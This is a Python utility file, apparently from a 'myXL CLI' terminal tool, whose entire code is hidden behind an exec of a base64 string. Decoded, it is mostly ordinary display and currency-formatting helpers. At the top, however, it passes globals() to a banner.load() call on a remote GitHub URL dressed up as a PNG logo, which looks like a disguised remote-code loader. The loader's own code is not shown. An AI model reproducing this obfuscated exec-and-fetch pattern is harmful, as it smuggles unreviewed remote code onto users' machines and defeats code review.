#!/usr/bin/env python3
import base64
exec(base64.b64decode('ZnJvbSBkb3RlbnYgaW1wb3J0IGxvYWRfZG90ZW52CmltcG9ydCBhcHAubWVudXMuYmFubmVyIGFzIGJhbm5lcgphc2NpaV9hcnQgPSBiYW5uZXIubG9hZCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tjZXB1ODc3L2l6aW4vbWFpbi9pbnRlcm5hdGlvbmFsLWdlbmV0aWNhbGx5LWVuZ2luZWVyZWQtbWFjaGluZS1lLWNvbGktdGh1bWItZ2VuZXRpYy1lbmdpbmVlcmluZy1sb2dvLW90aGVycy00MGE5YjZlNDQyMjRhMjI0MTAyMzRiYjBkNzIyZWYwMy5wbmciLCBnbG9iYWxzKCkpCmFzY2lpX2FydCA9IGJhbm5lci5sb2FkKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2NlcHU4NzcvaXppbi9tYWluL2ludGVybmF0aW9uYWwtZ2VuZXRpY2FsbHktZW5naW5lZXJlZC1tYWNoaW5lLWUtY29saS10aHVtYi1nZW5ldGljLWVuZ2luZWVyaW5nLWxvZ28tb3RoZXJzLTQwYTliNmU0NDIyNGEyMjQxMDIzNGJiMGQ3MjJlZjAzLnBuZyIsIGdsb2JhbHMoKSkKaW1wb3J0IHJlcXVlc3RzCmZyb20gaHRtbC5wYXJzZXIgaW1wb3J0IEhUTUxQYXJzZXIKCmltcG9ydCBvcwppbXBvcnQgdGV4dHdyYXAKaW1wb3J0IHJlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gcmljaC5jb25zb2xlIGltcG9ydCBDb25zb2xlCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwKZnJvbSByaWNoLnRhYmxlIGltcG9ydCBUYWJsZQpmcm9tIHJpY2guYWxpZ24gaW1wb3J0IEFsaWduCmZyb20gcmljaCBpbXBvcnQgYm94CmZyb20gYXBwLmNvbmZpZy50aGVtZV9jb25maWcgaW1wb3J0IGdldF90aGVtZQoKY29uc29sZSA9IENvbnNvbGUoKQpsb2FkX2RvdGVudigpCgpkZWYgcHJpbnRfYmFubmVyKCk6CiAgICB0aGVtZSA9IGdldF90aGVtZSgpCiAgICBiYW5uZXJfdGV4dCA9IEFsaWduLmNlbnRlcigKICAgICAgICAiW2JvbGRdbXlYTCBDTEkgdjguOC4wIGdlbi5aWy9dIiwKICAgICAgICB2ZXJ0aWNhbD0ibWlkZGxlIgogICAgKQogICAgY29uc29sZS5wcmludChQYW5lbCgKICAgICAgICBiYW5uZXJfdGV4dCwKICAgICAgICBib3JkZXJfc3R5bGU9dGhlbWVbImJvcmRlcl9wcmltYXJ5Il0sCiAgICAgICAgc3R5bGU9dGhlbWVbInRleHRfdGl0bGUiXSwKICAgICAgICBwYWRkaW5nPSgxLCAyKSwKICAgICAgICBleHBhbmQ9VHJ1ZSwKICAgICAgICBib3g9Ym94LkRPVUJMRQogICAgKSkKCmRlZiBjbGVhcl9zY3JlZW4oKToKICAgIHByaW50KCJDbGVhcmluZyBzY3JlZW4uLi4iKQogICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCiAgICBpZiBhc2NpaV9hcnQ6CiAgICAgICAgYXNjaWlfYXJ0LnRvX3Rlcm1pbmFsKGNvbHVtbnM9NTUpCgogICAgcHJpbnRfYmFubmVyKCkKCmRlZiBwcmludF9wYW5lbCh0aXRsZSwgY29udGVudCwgYm9yZGVyX3N0eWxlPU5vbmUpOgogICAgdGhlbWUgPSBnZXRfdGhlbWUoKQogICAgY29uc29sZSA9IENvbnNvbGUoKQogICAgc3R5bGUgPSBib3JkZXJfc3R5bGUgb3IgdGhlbWVbImJvcmRlcl9pbmZvIl0KICAgIGNvbnNvbGUucHJpbnQoUGFuZWwoY29udGVudCwgdGl0bGU9dGl0bGUsIHRpdGxlX2FsaWduPSJsZWZ0IiwgYm9yZGVyX3N0eWxlPXN0eWxlKSkKCgpkZWYgcHJpbnRfbWVudSh0aXRsZSwgb3B0aW9ucyk6CiAgICB0aGVtZSA9IGdldF90aGVtZSgpCiAgICB0YWJsZSA9IFRhYmxlKHRpdGxlPXRpdGxlLCBib3g9Ym94LlNJTVBMRSwgc2hvd19oZWFkZXI9RmFsc2UpCiAgICBmb3Iga2V5LCBsYWJlbCBpbiBvcHRpb25zLml0ZW1zKCk6CiAgICAgICAgdGFibGUuYWRkX3JvdyhmIlt7dGhlbWVbJ3RleHRfa2V5J119XXtrZXl9Wy97dGhlbWVbJ3RleHRfa2V5J119XSIsIGYiW3t0aGVtZVsndGV4dF92YWx1ZSddfV17bGFiZWx9Wy97dGhlbWVbJ3RleHRfdmFsdWUnXX1dIikKICAgIGNvbnNvbGUucHJpbnQodGFibGUpCgpkZWYgcHJpbnRfaW5mbyhsYWJlbCwgdmFsdWUpOgogICAgdGhlbWUgPSBnZXRfdGhlbWUoKQogICAgY29uc29sZS5wcmludChmIlt7dGhlbWVbJ3RleHRfc3ViJ119XXtsYWJlbH06Wy97dGhlbWVbJ3RleHRfc3ViJ119XSBbe3RoZW1lWyd0ZXh0X2JvZHknXX1de3ZhbHVlfVsve3RoZW1lWyd0ZXh0X2JvZHknXX1dIikKCmRlZiBnZXRfcnVwaWFoKHZhbHVlKSAtPiBzdHI6CiAgICB2YWx1ZV9zdHIgPSBzdHIodmFsdWUpLnN0cmlwKCkKICAgIHZhbHVlX3N0ciA9IHJlLnN1YihyIl5ScFxzPyIsICIiLCB2YWx1ZV9zdHIpCiAgICBtYXRjaCA9IHJlLm1hdGNoKHIiKFtcZCxdKykoLiopIiwgdmFsdWVfc3RyKQogICAgaWYgbm90IG1hdGNoOgogICAgICAgIHJldHVybiB2YWx1ZV9zdHIKCiAgICByYXdfbnVtYmVyID0gbWF0Y2guZ3JvdXAoMSkucmVwbGFjZSgiLCIsICIiKQogICAgc3VmZml4ID0gbWF0Y2guZ3JvdXAoMikuc3RyaXAoKQoKICAgIHRyeToKICAgICAgICBudW1iZXIgPSBpbnQocmF3X251bWJlcikKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHJldHVybiB2YWx1ZV9zdHIKCiAgICBmb3JtYXR0ZWRfbnVtYmVyID0gZiJ7bnVtYmVyOix9Ii5yZXBsYWNlKCIsIiwgIi4iKQogICAgZm9ybWF0dGVkID0gZiJ7Zm9ybWF0dGVkX251bWJlcn0sLSIKICAgIHJldHVybiBmIntmb3JtYXR0ZWR9IHtzdWZmaXh9IiBpZiBzdWZmaXggZWxzZSBmb3JtYXR0ZWQKCmRlZiBsaXZlX2xvYWRpbmcodGV4dDogc3RyLCB0aGVtZTogZGljdCk6CiAgICByZXR1cm4gY29uc29sZS5zdGF0dXMoZiJbe3RoZW1lWyd0ZXh0X3N1YiddfV17dGV4dH1bL3t0aGVtZVsndGV4dF9zdWInXX1dIiwgc3Bpbm5lcj0iZG90cyIpCg==').decode())
